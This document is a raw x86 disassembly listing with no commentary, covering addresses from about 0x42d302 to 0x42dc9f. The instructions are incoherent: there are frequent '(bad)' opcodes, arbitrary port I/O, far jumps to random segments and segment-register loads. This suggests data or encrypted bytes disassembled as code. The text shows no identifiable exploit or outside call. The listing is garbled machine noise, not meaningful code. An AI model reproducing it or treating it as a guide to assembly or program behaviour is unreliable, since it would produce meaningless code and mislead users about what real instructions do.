  42d302:	mov    ah,0x12
  42d304:	(bad)  
  42d305:	xchg   ecx,eax
  42d306:	adc    eax,0x24bb8e3c
  42d30b:	sub    eax,0xdea114e3
  42d310:	mov    al,ds:0x5c896637
  42d315:	add    BYTE PTR [esp+eax*1+0x16],dh
  42d319:	pop    ebp
  42d31a:	pushf  
  42d31b:	cmp    DWORD PTR [edi-0x2],esi
  42d31e:	inc    ebx
  42d31f:	in     al,0xfa
  42d321:	inc    eax
  42d322:	cmp    al,bl
  42d324:	mov    bl,0x7d
  42d326:	jp     0x42d2c6
  42d328:	xchg   ebp,eax
  42d329:	pop    esp
  42d32a:	mov    edx,0xf46efe00
  42d32f:	into   
  42d330:	pop    ds
  42d331:	loopne 0x42d3a3
  42d333:	pusha  
  42d334:	in     al,0xe0
  42d336:	out    0x43,eax
  42d338:	sub    al,0x1
  42d33a:	cdq    
  42d33b:	fcomp  DWORD PTR [esi+ebp*4+0x5c]
  42d33f:	fld    TBYTE PTR [ebx]
  42d341:	or     eax,0x67ef39e0
  42d346:	push   esi
  42d347:	mov    esp,0xc7bcbf17
  42d34c:	mov    ecx,esi
  42d34e:	in     al,dx
  42d34f:	mov    eax,ds:0xeea4d11a
  42d354:	xor    eax,0x50f872a4
  42d359:	inc    edx
  42d35a:	arpl   WORD PTR [ecx+ebx*8-0x37],bx
  42d35e:	sar    BYTE PTR [ebp-0x16],0xa4
  42d362:	cmp    DWORD PTR [eax],ebp
  42d364:	cmp    BYTE PTR ds:[ecx],0x17
  42d368:	mov    ss,WORD PTR [edx]
  42d36a:	pop    esi
  42d36b:	inc    eax
  42d36c:	or     BYTE PTR [ebx],ch
  42d36e:	ja     0x42d341
  42d370:	xchg   esi,eax
  42d371:	les    ebx,FWORD PTR [ecx+0x736a6cf7]
  42d377:	in     al,0x86
  42d379:	push   esp
  42d37a:	repz addr16 push ss
  42d37d:	sbb    DWORD PTR [esi-0x729247e5],ebx
  42d383:	jb     0x42d3c8
  42d385:	sahf   
  42d386:	dec    esp
  42d387:	mov    ds:0x75737b8f,al
  42d38c:	ror    dh,0x4
  42d38f:	lahf   
  42d390:	aaa    
  42d391:	lds    edi,FWORD PTR [ebx-0x3cf5e517]
  42d397:	repz pop es
  42d399:	push   ebx
  42d39a:	adc    al,0xea
  42d39c:	pop    esp
  42d39d:	pop    edx
  42d39e:	pop    ebx
  42d39f:	shl    BYTE PTR [esi],cl
  42d3a1:	jge    0x42d342
  42d3a3:	int    0x2b
  42d3a5:	adc    esp,DWORD PTR [ebp+0x5f]
  42d3a8:	scas   eax,DWORD PTR es:[edi]
  42d3a9:	push   ebp
  42d3aa:	out    dx,eax
  42d3ab:	imul   ecx,DWORD PTR [edx+0x3f],0x12
  42d3af:	out    0x89,al
  42d3b1:	frstor [edx]
  42d3b3:	addr16 mov edi,0x75d40f3b
  42d3b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d3ba:	jns    0x42d385
  42d3bc:	(bad)  
  42d3bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d3be:	dec    eax
  42d3bf:	je     0x42d41c
  42d3c1:	xor    DWORD PTR [esi+0x766e76e2],eax
  42d3c7:	mov    dh,0x5b
  42d3c9:	mov    ebx,0xdcfa3523
  42d3ce:	xchg   BYTE PTR [esi-0xc],bl
  42d3d1:	enter  0x4f60,0x62
  42d3d5:	pop    ecx
  42d3d6:	pop    ecx
  42d3d7:	mov    ah,0x9d
  42d3d9:	(bad)  
  42d3da:	int3   
  42d3db:	xchg   ebx,eax
  42d3dc:	add    dl,BYTE PTR [edx-0x10]
  42d3df:	sub    BYTE PTR [edx+ebp*8+0x22c656ca],dl
  42d3e6:	sub    esi,esp
  42d3e8:	push   ds
  42d3e9:	aad    0xad
  42d3eb:	jbe    0x42d3f7
  42d3ed:	jp     0x42d3ef
	...
  42d453:	add    BYTE PTR [eax],al
  42d455:	add    cl,al
  42d457:	into   
  42d458:	arpl   WORD PTR [ecx-0x21044291],bx
  42d45e:	pop    ecx
  42d45f:	xchg   esp,eax
  42d460:	aaa    
  42d461:	pushf  
  42d462:	inc    esp
  42d463:	arpl   WORD PTR [edi+0x1e56764],di
  42d469:	add    BYTE PTR [eax],al
  42d46b:	add    DWORD PTR [eax],eax
  42d46d:	add    BYTE PTR [ecx-0x25],ch
  42d470:	dec    esp
  42d471:	nop
  42d472:	adc    al,0xdd
  42d474:	and    al,0x97
  42d476:	sub    BYTE PTR [esi-0x37],dl
  42d479:	sbb    DWORD PTR ds:0x1599f3e2,esi
  42d47f:	jecxz  0x42d4f3
  42d481:	imul   ecx,DWORD PTR [ecx+0x33196123],0x605541ea
  42d48b:	mov    ebx,0x7241e7fa
  42d490:	or     BYTE PTR [esi+0x3baf9e0b],ah
  42d496:	and    DWORD PTR [edi-0x7bbd3e85],eax
  42d49c:	jg     0x42d4fe
  42d49e:	mov    ch,0x97
  42d4a0:	mov    al,0x47
  42d4a2:	pop    edx
  42d4a3:	gs sbb edi,esp
  42d4a6:	xchg   bh,ah
  42d4a8:	mov    ch,bh
  42d4aa:	push   cs
  42d4ab:	push   0x3c
  42d4ad:	call   0xe6f17686
  42d4b2:	mov    edi,0xa039ba2c
  42d4b7:	or     eax,0x952210f9
  42d4bc:	pushf  
  42d4bd:	jae    0x42d486
  42d4bf:	mov    eax,ds:0xcaf19cc9
  42d4c4:	sbb    cl,BYTE PTR [edi]
  42d4c6:	push   esi
  42d4c7:	dec    ebp
  42d4c8:	shr    ebx,cl
  42d4ca:	ret    0xd2
  42d4cd:	addr16 mov eax,0x5ac03fcf
  42d4d3:	or     eax,0x85243c0
  42d4d8:	int    0xcd
  42d4da:	das    
  42d4db:	add    eax,0x72d138f5
  42d4e0:	inc    edx
  42d4e1:	mov    dh,0xba
  42d4e3:	stos   DWORD PTR es:[edi],eax
  42d4e4:	stos   BYTE PTR es:[edi],al
  42d4e5:	pop    ds
  42d4e6:	lods   al,BYTE PTR ds:[esi]
  42d4e7:	jmp    DWORD PTR [edi+ebx*4]
  42d4ea:	adc    dl,al
  42d4ec:	jg     0x42d4ba
  42d4ee:	rcl    BYTE PTR [ebx+0x7b830900],0xca
  42d4f5:	outs   dx,DWORD PTR ds:[esi]
  42d4f6:	xor    esi,ebp
  42d4f8:	jno    0x42d4ce
  42d4fa:	ins    BYTE PTR es:[edi],dx
  42d4fb:	fidivr DWORD PTR [esi]
  42d4fd:	sbb    al,0xe7
  42d4ff:	and    esi,DWORD PTR [ecx-0x7c7920ce]
  42d505:	mov    eax,0x3f4f9ea0
  42d50a:	imul   ebx,DWORD PTR [ecx+ecx*1],0x33
  42d50e:	int    0x4b
  42d510:	fidivr WORD PTR [edi]
  42d512:	shl    DWORD PTR ds:0x24f0686,cl
  42d518:	add    ax,0x8ebf
  42d51c:	nop
  42d51d:	mov    cl,BYTE PTR [edi+0x7e2fc07b]
  42d523:	cmp    eax,0x94911433
  42d528:	ja     0x42d554
  42d52a:	push   eax
  42d52b:	sub    BYTE PTR [esi-0x5d],bl
  42d52e:	test   BYTE PTR ds:0xec0c9f76,ah
  42d534:	fsubr  st(3),st
  42d536:	(bad)  
  42d537:	xchg   ebx,eax
  42d538:	xchg   ebx,eax
  42d539:	loop   0x42d5b0
  42d53b:	call   0x3bbb:0xa7bc4274
  42d542:	jle    0x42d5c1
  42d544:	fdivr  st,st(2)
  42d546:	sbb    BYTE PTR [edi+0x6d],0xc5
  42d54a:	push   ebx
  42d54b:	neg    DWORD PTR [esi+0x20]
  42d54e:	lds    esi,FWORD PTR [esi+eax*2-0x6858ff65]
  42d555:	dec    ebx
  42d556:	call   0xf5121c59
  42d55b:	cs neg cl
  42d55e:	mov    BYTE PTR [ebp+0x7157b6a0],dh
  42d564:	test   BYTE PTR [eax+0x7b],cl
  42d567:	std    
  42d568:	and    cl,ah
  42d56a:	add    DWORD PTR [ebp+0x2f65],ebx
	...
  42d5d4:	add    BYTE PTR [eax],al
  42d5d6:	cdq    
  42d5d7:	cmc    
  42d5d8:	adc    BYTE PTR [ebx-0x12],0x77
  42d5dc:	fcos   
  42d5de:	pop    ebp
  42d5df:	mov    ds:0xea1bacd5,eax
  42d5e5:	adc    eax,0x1e667
  42d5ea:	add    BYTE PTR [ecx],al
  42d5ec:	add    BYTE PTR [eax],al
  42d5ee:	pop    eax
  42d5ef:	ds jl  0x42d607
  42d5f2:	fsub   DWORD PTR [ebx-0x6a]
  42d5f5:	sub    DWORD PTR fs:[ebp-0x5f],0x10
  42d5fa:	(bad)  
  42d5fb:	les    ebx,FWORD PTR [ecx+0x20ffeeae]
  42d601:	and    ch,BYTE PTR [eax-0x28a33fc0]
  42d607:	fisttp DWORD PTR [eax]
  42d609:	adc    ebp,DWORD PTR [ecx+0xb1f6db8]
  42d60f:	inc    eax
  42d610:	imul   ecx,DWORD PTR [esi+0x1c3c06b5],0x167cc23
  42d61a:	(bad)  
  42d61b:	fisub  WORD PTR [edi+0x79a4b76]
  42d621:	xchg   ch,bl
  42d623:	xchg   BYTE PTR [edx],bh
  42d625:	inc    eax
  42d626:	xchg   edi,eax
  42d627:	add    al,0xb1
  42d629:	jge    0x42d5d9
  42d62b:	inc    esp
  42d62c:	or     eax,0xce9fd2a9
  42d631:	cmp    al,0xf2
  42d633:	arpl   cx,ax
  42d635:	inc    esp
  42d636:	(bad)  
  42d637:	sbb    esi,DWORD PTR [esi]
  42d639:	or     DWORD PTR [ecx+0x49041e3f],0x17
  42d640:	(bad)  [edx+ebx*1-0x6e]
  42d644:	cld    
  42d645:	loop   0x42d60b
  42d647:	dec    ebp
  42d648:	scas   al,BYTE PTR es:[edi]
  42d649:	or     DWORD PTR [ebp-0x38],esi
  42d64c:	into   
  42d64d:	es jp  0x42d5db
  42d650:	repz mov ds:0x84019aae,al
  42d656:	add    BYTE PTR [esi-0x5a219ab0],al
  42d65c:	dec    edx
  42d65d:	jnp    0x42d61a
  42d65f:	jb     0x42d694
  42d661:	and    eax,0x470b4239
  42d666:	cwde   
  42d667:	dec    eax
  42d668:	(bad)  
  42d669:	scas   eax,DWORD PTR es:[edi]
  42d66a:	ror    al,1
  42d66c:	rcr    dl,1
  42d66e:	aas    
  42d66f:	push   es
  42d670:	xor    DWORD PTR [edi-0x73b7b4bb],0xffffff98
  42d677:	adc    BYTE PTR [ebx+0x28],ah
  42d67a:	cmp    eax,0x3b9d6a3d
  42d67f:	gs add al,0xdb
  42d682:	adc    BYTE PTR [ebp+0x19],ah
  42d685:	cdq    
  42d686:	in     eax,dx
  42d687:	mov    ch,0x8
  42d689:	out    0xa4,al
  42d68b:	sbb    eax,edx
  42d68d:	sbb    BYTE PTR [edi+0x74],ch
  42d690:	fidiv  DWORD PTR [esi-0x6e4d54ba]
  42d696:	rcl    bl,cl
  42d698:	push   0x24644b1f
  42d69d:	jle    0x42d66e
  42d69f:	xchg   edx,eax
  42d6a0:	push   edi
  42d6a1:	je     0x42d6a8
  42d6a3:	repnz add eax,0x2f2a591b
  42d6a9:	in     al,dx
  42d6aa:	ss jae 0x42d6a4
  42d6ad:	xchg   esp,eax
  42d6ae:	mov    esi,0x79702c88
  42d6b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d6b4:	imul   eax,ebp,0x780875b6
  42d6ba:	cli    
  42d6bb:	jecxz  0x42d6d3
  42d6bd:	sar    ebx,0x25
  42d6c0:	int    0xd6
  42d6c2:	rcl    DWORD PTR [edi+0x44],0xb1
  42d6c6:	arpl   WORD PTR [ebx],sp
  42d6c8:	rol    ch,1
  42d6ca:	in     al,dx
  42d6cb:	test   eax,0xd5e8f60c
  42d6d0:	aaa    
  42d6d1:	inc    esi
  42d6d2:	daa    
  42d6d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d6d4:	push   edx
  42d6d5:	mov    eax,ds:0xd251d26f
  42d6da:	iret   
  42d6db:	sbb    bl,dl
  42d6dd:	daa    
  42d6de:	mov    ch,0x1a
  42d6e0:	dec    ebx
  42d6e1:	sbb    al,0x38
  42d6e3:	dec    edx
  42d6e4:	or     ebx,esi
  42d6e6:	pop    ecx
  42d6e7:	mov    dl,0xe4
  42d6e9:	xchg   esi,eax
  42d6ea:	inc    edx
  42d6eb:	mov    ds:0x89da,eax
	...
  42d754:	add    BYTE PTR [eax],al
  42d756:	repz add esp,DWORD PTR [eax]
  42d759:	(bad)  
  42d75a:	lock scas eax,DWORD PTR es:[edi]
  42d75c:	(bad)  
  42d75d:	jg     0x42d6e0
  42d75f:	in     al,0x2c
  42d761:	and    al,0x25
  42d763:	jae    0x42d72c
  42d765:	jno    0x42d7ce
  42d767:	out    0x1,eax
  42d769:	add    BYTE PTR [eax],al
  42d76b:	add    DWORD PTR [eax],eax
  42d76d:	add    bl,bl
  42d76f:	iret   
  42d770:	jnp    0x42d71f
  42d772:	sub    ebx,DWORD PTR [bx+di+0x58]
  42d776:	arpl   WORD PTR [ebp+0x702baf36],di
  42d77c:	jne    0x42d73b
  42d77e:	jmp    0x5b46:0x7347c7f7
  42d785:	xchg   al,cl
  42d787:	dec    ebx
  42d788:	fist   WORD PTR [edi]
  42d78a:	(bad)  
  42d78b:	(bad)  
  42d78c:	xor    al,0x82
  42d78e:	push   ebp
  42d78f:	or     al,0xfb
  42d791:	shl    bl,cl
  42d793:	jmp    FWORD PTR [edx-0x35]
  42d796:	dec    ecx
  42d797:	repz mov ch,0x48
  42d79a:	fwait
  42d79b:	mov    ds:0xbdc15d2e,eax
  42d7a0:	or     DWORD PTR [ebx-0x67],ebx
  42d7a3:	pop    esi
  42d7a4:	sar    DWORD PTR [edi-0x1fb90abb],0x7a
  42d7ab:	adc    DWORD PTR [edx+eax*1],ebp
  42d7ae:	sbb    esp,DWORD PTR [edx]
  42d7b0:	shl    BYTE PTR [edx+0x7f],0xdb
  42d7b4:	inc    esp
  42d7b5:	pusha  
  42d7b6:	sub    eax,0x3022e111
  42d7bb:	cmp    bl,al
  42d7bd:	mov    eax,0x7ea5be10
  42d7c2:	sbb    ax,0xc639
  42d7c6:	das    
  42d7c7:	mov    cl,0x9f
  42d7c9:	test   DWORD PTR [ebp-0x2012cee7],ebp
  42d7cf:	stos   BYTE PTR es:[edi],al
  42d7d0:	cmp    eax,eax
  42d7d2:	dec    esi
  42d7d3:	sar    ah,1
  42d7d5:	cwde   
  42d7d6:	sbb    DWORD PTR [ecx+0x33],0xf11ac4cd
  42d7dd:	and    eax,0x805d9bcf
  42d7e2:	cmp    eax,0x12162e6e
  42d7e7:	mov    edx,0x5d5475d6
  42d7ec:	repnz xlat BYTE PTR ds:[ebx]
  42d7ee:	adc    ecx,DWORD PTR [ebp+0x1c]
  42d7f1:	cmc    
  42d7f2:	fwait
  42d7f3:	push   ds
  42d7f4:	push   cs
  42d7f5:	mov    ch,0xbb
  42d7f7:	mov    eax,0xd1bb3322
  42d7fc:	fstp   QWORD PTR [edi-0x68]
  42d7ff:	sbb    BYTE PTR [edx+0x79],dl
  42d802:	or     ch,ah
  42d804:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d805:	cld    
  42d806:	add    DWORD PTR [bp+si],edx
  42d809:	retf   0xde9a
  42d80c:	pushf  
  42d80d:	jno    0x42d854
  42d80f:	ret    
  42d810:	inc    esp
  42d811:	stos   BYTE PTR es:[edi],al
  42d812:	jmp    0xfd5b:0x9bd991e2
  42d819:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d81a:	jno    0x42d81a
  42d81c:	sub    DWORD PTR [ebx+0x4c],edi
  42d81f:	lods   al,BYTE PTR ds:[esi]
  42d820:	and    ebx,DWORD PTR [edi+0x35b96858]
  42d826:	daa    
  42d827:	cdq    
  42d828:	in     eax,dx
  42d829:	fnstenv [ebx+0x42]
  42d82c:	ffreep st(7)
  42d82e:	push   esi
  42d82f:	jne    0x42d897
  42d831:	or     DWORD PTR [esi-0x4a38e1a2],0xc5c8eb21
  42d83b:	es (bad) 
  42d83d:	enter  0x9677,0xdb
  42d841:	xchg   esp,eax
  42d842:	pop    ebx
  42d843:	in     al,dx
  42d844:	sub    eax,0x31bc2563
  42d849:	and    dl,bh
  42d84b:	fsubr  st(4),st
  42d84d:	test   BYTE PTR [ebx-0x5f],al
  42d850:	mov    ds:0xd6228941,eax
  42d855:	hlt    
  42d856:	xchg   esi,eax
  42d857:	(bad)  
  42d858:	cwde   
  42d859:	jbe    0x42d866
  42d85b:	addr16 js 0x42d866
  42d85e:	sbb    ah,BYTE PTR ds:0x298892f2
  42d864:	je     0x42d8be
  42d866:	out    dx,eax
  42d867:	sub    eax,0xc416ef6c
  42d86c:	push   ds
  42d86d:	adc    eax,0x0
	...
  42d8d6:	xchg   esi,eax
  42d8d7:	fwait
  42d8d8:	cwde   
  42d8d9:	pop    edi
  42d8da:	popf   
  42d8db:	pop    edi
  42d8dc:	xlat   BYTE PTR ds:[ebx]
  42d8dd:	fistp  DWORD PTR ds:0xbcc6961a
  42d8e3:	inc    ebp
  42d8e4:	(bad)  
  42d8e5:	mov    ebp,0x1e867
  42d8ea:	add    BYTE PTR [ecx],al
  42d8ec:	add    BYTE PTR [eax],al
  42d8ee:	dec    esp
  42d8ef:	test   BYTE PTR [edi-0x1ab5ca6d],al
  42d8f5:	(bad)  
  42d8f7:	retf   0xbb8
  42d8fa:	sbb    BYTE PTR [ebp-0x2c],cl
  42d8fd:	cli    
  42d8fe:	adc    al,bh
  42d900:	retf   0x7a26
  42d903:	mov    WORD PTR [esi-0x6c728f0a],ss
  42d909:	xchg   edi,eax
  42d90a:	dec    esi
  42d90b:	or     bh,dh
  42d90d:	and    BYTE PTR [esi],0x8d
  42d910:	add    al,0x51
  42d912:	xchg   esp,eax
  42d913:	mov    eax,0x19076443
  42d918:	jmp    0x7b77d2f9
  42d91d:	stos   BYTE PTR es:[edi],al
  42d91e:	jl     0x42d995
  42d920:	or     al,0x91
  42d922:	dec    edx
  42d923:	sub    BYTE PTR [ebx-0x21],dl
  42d926:	or     eax,edx
  42d928:	and    al,0xf1
  42d92a:	test   BYTE PTR ss:[edx],dh
  42d92d:	jae    0x42d8c7
  42d92f:	icebp  
  42d930:	push   eax
  42d931:	xchg   DWORD PTR [eax-0x47],esp
  42d934:	add    eax,0xee3fe9de
  42d939:	iret   
  42d93a:	loope  0x42d9a7
  42d93c:	and    bh,BYTE PTR [esi-0xe]
  42d93f:	add    edi,DWORD PTR [ebx-0x6af7f162]
  42d945:	xchg   ecx,eax
  42d946:	stos   DWORD PTR es:[edi],eax
  42d947:	(bad)  
  42d949:	pop    DWORD PTR [edi+eiz*1-0x5c]
  42d94d:	call   0x264e5dbd
  42d952:	push   ebx
  42d953:	ficom  DWORD PTR [esi]
  42d955:	lds    ebp,FWORD PTR [ecx-0x33]
  42d958:	pop    esp
  42d959:	mov    ah,0x2f
  42d95b:	jp     0x42d906
  42d95d:	outs   dx,BYTE PTR ds:[esi]
  42d95e:	leave  
  42d95f:	cmp    al,0x49
  42d961:	mov    edi,0xedfe0acb
  42d966:	xor    edi,edx
  42d968:	jnp    0x42d972
  42d96a:	std    
  42d96b:	jge    0x42d9e3
  42d96d:	add    BYTE PTR [eax+eiz*1],cl
  42d970:	inc    edx
  42d971:	cmp    al,0x6d
  42d973:	push   esi
  42d974:	ret    0x97e5
  42d977:	push   ds
  42d978:	pusha  
  42d979:	xchg   ebp,eax
  42d97a:	pop    esp
  42d97b:	xchg   esp,eax
  42d97c:	inc    ebp
  42d97d:	jb     0x42d935
  42d97f:	imul   DWORD PTR [edx+0x7ce2ab4d]
  42d985:	push   ebx
  42d986:	inc    ebp
  42d987:	nop
  42d988:	xor    eax,0x8b7a1ac8
  42d98d:	mov    DWORD PTR [edi-0x6a50a90],ebx
  42d993:	lea    ecx,[edx]
  42d995:	xchg   ebx,eax
  42d996:	dec    esi
  42d997:	iret   
  42d998:	mov    eax,ds:0xfde3368d
  42d99d:	dec    ebp
  42d99e:	adc    BYTE PTR [eax+0x52],bh
  42d9a1:	pop    ebp
  42d9a2:	push   ds
  42d9a3:	(bad)  
  42d9a4:	jns    0x42d939
  42d9a6:	sbb    bl,BYTE PTR [esi-0x8877ca6]
  42d9ac:	push   ds
  42d9ad:	sahf   
  42d9ae:	mov    ebx,0xebd4d1fa
  42d9b3:	scas   al,BYTE PTR es:[edi]
  42d9b4:	push   ecx
  42d9b5:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  42d9b7:	xchg   BYTE PTR [edi],dh
  42d9b9:	call   edx
  42d9bb:	dec    ebx
  42d9bc:	icebp  
  42d9bd:	lods   eax,DWORD PTR ds:[esi]
  42d9be:	(bad)  
  42d9bf:	popf   
  42d9c0:	xor    DWORD PTR [di+0x56],ebp
  42d9c4:	sbb    BYTE PTR [edx-0x54],dl
  42d9c7:	mov    eax,ds:0xecf2671b
  42d9cc:	push   ebp
  42d9cd:	test   al,0x5a
  42d9cf:	and    dh,BYTE PTR [edi]
  42d9d1:	or     eax,0xa85a39d
  42d9d6:	cmp    BYTE PTR [ebx],dl
  42d9d8:	pmulhuw mm1,QWORD PTR [ebx+0x6]
  42d9dc:	jmp    0xd81d:0x6aff4506
  42d9e3:	daa    
  42d9e4:	push   ecx
  42d9e5:	pushf  
  42d9e6:	popa   
  42d9e7:	dec    esi
  42d9e8:	mov    ?,WORD PTR [ecx-0x2d]
  42d9eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d9ec:	ins    DWORD PTR es:[edi],dx
  42d9ed:	test   eax,0x0
	...
  42da56:	stc    
  42da57:	mov    cl,0x70
  42da59:	dec    eax
  42da5a:	js     0x42da25
  42da5c:	stc    
  42da5d:	mov    cl,0xbf
  42da5f:	dec    edi
  42da60:	int    0xe1
  42da62:	ins    DWORD PTR es:[edi],dx
  42da63:	into   
  42da64:	imul   ebx,DWORD PTR [edi+eiz*2],0x1e9
  42da6b:	add    DWORD PTR [eax],eax
  42da6d:	add    bh,ah
  42da6f:	and    BYTE PTR [ecx+eax*1-0x5de74edb],dl
  42da76:	or     BYTE PTR [eax+0x7089cb78],dh
  42da7c:	jbe    0x42da45
  42da7e:	xor    bh,dl
  42da80:	ror    DWORD PTR [esi-0x2e],0xa2
  42da84:	push   ds
  42da85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da86:	jg     0x42da28
  42da88:	stos   BYTE PTR es:[edi],al
  42da89:	arpl   WORD PTR [ebx-0x71e84a9a],bx
  42da8f:	adc    ebx,eax
  42da91:	pop    eax
  42da92:	adc    al,0x7
  42da94:	cmp    al,0x69
  42da96:	xchg   ebp,eax
  42da97:	ss sti 
  42da99:	xchg   esp,esi
  42da9b:	cmp    esi,DWORD PTR [esi]
  42da9d:	and    eax,0x5acf470d
  42daa2:	cwde   
  42daa3:	outs   dx,BYTE PTR ds:[esi]
  42daa4:	dec    ebp
  42daa5:	or     dh,BYTE PTR [edi-0x68304d8f]
  42daab:	push   edx
  42daac:	cmp    esp,DWORD PTR [ecx]
  42daae:	pop    esp
  42daaf:	scas   al,BYTE PTR es:[edi]
  42dab0:	js     0x42dafe
  42dab2:	pop    ss
  42dab3:	icebp  
  42dab4:	pop    edi
  42dab5:	lahf   
  42dab6:	adc    eax,0xf576a37b
  42dabb:	fisttp QWORD PTR [edi]
  42dabd:	or     eax,0x6f459ea4
  42dac2:	and    BYTE PTR [ecx+0x51],cl
  42dac5:	adc    BYTE PTR [esi-0x74856039],dh
  42dacb:	stos   BYTE PTR es:[edi],al
  42dacc:	test   eax,0x5cf7f4ae
  42dad1:	cmp    eax,0x3826a771
  42dad6:	push   ebx
  42dad7:	cmp    edi,DWORD PTR [ebx+0x36]
  42dada:	mov    edi,0x8d62a52f
  42dadf:	cmp    BYTE PTR [eax-0x63347ab6],0x18
  42dae6:	loop   0x42dabe
  42dae8:	into   
  42dae9:	inc    ecx
  42daea:	(bad)  
  42daeb:	push   ecx
  42daec:	(bad)
  42daef:	mov    ch,0xb6
  42daf1:	jae    0x42da7e
  42daf3:	pop    edx
  42daf4:	adc    esi,DWORD PTR [ecx]
  42daf6:	fcomp  st(1)
  42daf8:	mov    ch,0x0
  42dafa:	stc    
  42dafb:	lahf   
  42dafc:	mov    ecx,0x75b5e1f2
  42db01:	jae    0x42db6a
  42db03:	dec    eax
  42db04:	dec    edi
  42db05:	add    DWORD PTR [esi+0xb],esi
  42db08:	mov    ch,0x80
  42db0a:	xchg   esi,eax
  42db0b:	loop   0x42db7d
  42db0d:	ret    
  42db0e:	pop    esi
  42db0f:	mov    cl,0x40
  42db11:	cwde   
  42db12:	(bad)  
  42db13:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  42db15:	push   ds
  42db16:	outs   dx,BYTE PTR ds:[esi]
  42db17:	arpl   di,ax
  42db19:	sbb    al,0xf8
  42db1b:	jp     0x42db72
  42db1d:	dec    ecx
  42db1e:	sub    BYTE PTR [edi-0xf4d5a4a],dl
  42db24:	outs   dx,DWORD PTR ds:[esi]
  42db25:	mov    ah,dl
  42db27:	call   0x532a:0x2bc1a4c0
  42db2e:	cmp    eax,0xcc5ee41b
  42db33:	scas   eax,DWORD PTR es:[edi]
  42db34:	jns    0x42db6f
  42db36:	adc    eax,DWORD PTR [edx]
  42db38:	ins    DWORD PTR es:[edi],dx
  42db39:	pop    edi
  42db3a:	fadd   DWORD PTR [ebp-0x26]
  42db3d:	jg     0x42db0a
  42db3f:	outs   dx,DWORD PTR ds:[esi]
  42db40:	out    0xa9,al
  42db42:	pusha  
  42db43:	add    al,0xd2
  42db45:	cmp    BYTE PTR [ebp-0x42609d68],dh
  42db4b:	arpl   WORD PTR [ecx+0x6b],ax
  42db4e:	out    dx,eax
  42db4f:	mov    eax,0x7eb6c79d
  42db54:	push   edx
  42db55:	adc    ebx,DWORD PTR [eax-0x8]
  42db58:	jo     0x42db7e
  42db5a:	xor    ah,0x52
  42db5d:	lds    edx,FWORD PTR [edi]
  42db5f:	iret   
  42db60:	out    0xff,eax
  42db62:	call   0x28db:0x147e4f93
  42db69:	push   0x6ac83869
	...
  42dbd6:	mov    al,0x7a
  42dbd8:	pop    ds
  42dbd9:	ins    BYTE PTR es:[edi],dx
  42dbda:	fild   QWORD PTR [ebp-0xd]
  42dbdd:	(bad)  
  42dbde:	fwait
  42dbdf:	jns    0x42db7c
  42dbe1:	jns    0x42dbf8
  42dbe3:	mov    esi,0xea670125
  42dbe8:	add    DWORD PTR [eax],eax
  42dbea:	add    BYTE PTR [ecx],al
  42dbec:	add    BYTE PTR [eax],al
  42dbee:	lea    eax,[esp+edx*2]
  42dbf1:	inc    esi
  42dbf2:	jne    0x42dbb6
  42dbf4:	xchg   ecx,eax
  42dbf5:	sbb    BYTE PTR [ebx],bh
  42dbf7:	xchg   esp,eax
  42dbf8:	test   al,0xbd
  42dbfa:	mov    al,0x3f
  42dbfc:	jmp    0x42db88
  42dbfe:	fsubr  QWORD PTR [ecx-0x344088dd]
  42dc04:	inc    ebp
  42dc05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dc06:	and    ebp,ecx
  42dc08:	jb     0x42dc50
  42dc0a:	jg     0x42dbf0
  42dc0c:	jns    0x42dc7b
  42dc0e:	imul   esp,DWORD PTR [edi+0x4c],0x96937262
  42dc15:	and    cl,BYTE PTR [esi]
  42dc17:	or     cl,BYTE PTR [eax+0xf]
  42dc1a:	jb     0x42dbde
  42dc1c:	(bad)  
  42dc1d:	(bad)  
  42dc1e:	pop    ebx
  42dc1f:	xchg   esi,eax
  42dc20:	dec    ebp
  42dc21:	fisubr WORD PTR ds:0xcb29b6d5
  42dc27:	cmp    DWORD PTR [ebx],edx
  42dc29:	das    
  42dc2a:	(bad)  
  42dc2b:	xchg   esp,eax
  42dc2c:	addr16 inc eax
  42dc2e:	sub    esp,DWORD PTR [eax+0x49]
  42dc31:	(bad)  
  42dc32:	pop    ecx
  42dc33:	push   ss
  42dc34:	cs test bl,cl
  42dc37:	pop    edx
  42dc38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dc39:	jae    0x42dc2f
  42dc3b:	mov    dl,0xa7
  42dc3d:	jp     0x42dbd3
  42dc3f:	and    eax,0xfeba07cd
  42dc44:	fs xchg ebp,eax
  42dc46:	cmc    
  42dc47:	push   edi
  42dc48:	mov    edx,0x141d1ab8
  42dc4d:	pop    ecx
  42dc4e:	adc    al,0x49
  42dc50:	(bad)  
  42dc51:	cs out 0x1b,eax
  42dc54:	push   0xd9b7bcb0
  42dc59:	or     al,0x4a
  42dc5b:	xor    esi,ebx
  42dc5d:	in     eax,0xcc
  42dc5f:	in     al,dx
  42dc60:	sbb    DWORD PTR [ebx],edx
  42dc62:	ja     0x42dcd2
  42dc64:	sub    al,BYTE PTR [eax+0x12b47d6e]
  42dc6a:	dec    ecx
  42dc6b:	xchg   ecx,eax
  42dc6c:	idiv   BYTE PTR [ebx+0x39]
  42dc6f:	std    
  42dc70:	mov    ds:0x2f47b307,eax
  42dc75:	sbb    dh,bh
  42dc77:	retf   
  42dc78:	lods   eax,DWORD PTR ds:[esi]
  42dc79:	mov    ch,BYTE PTR ds:0x2759b35b
  42dc7f:	add    al,0x5f
  42dc81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dc82:	dec    eax
  42dc83:	icebp  
  42dc84:	xchg   edi,eax
  42dc85:	mov    edi,0x1998ee5
  42dc8a:	out    dx,al
  42dc8b:	mov    ds:0xbe13834f,al
  42dc90:	xchg   ecx,eax
  42dc91:	repz arpl dx,si
  42dc94:	mov    esi,DWORD PTR [eax+edx*8-0x7f]
  42dc98:	(bad)  [eax-0x4226dfec]
  42dc9e:	xchg   ebx,eax
  42dc9f:	xchg   DWORD PTR [edx+eax*1-0x52],esi
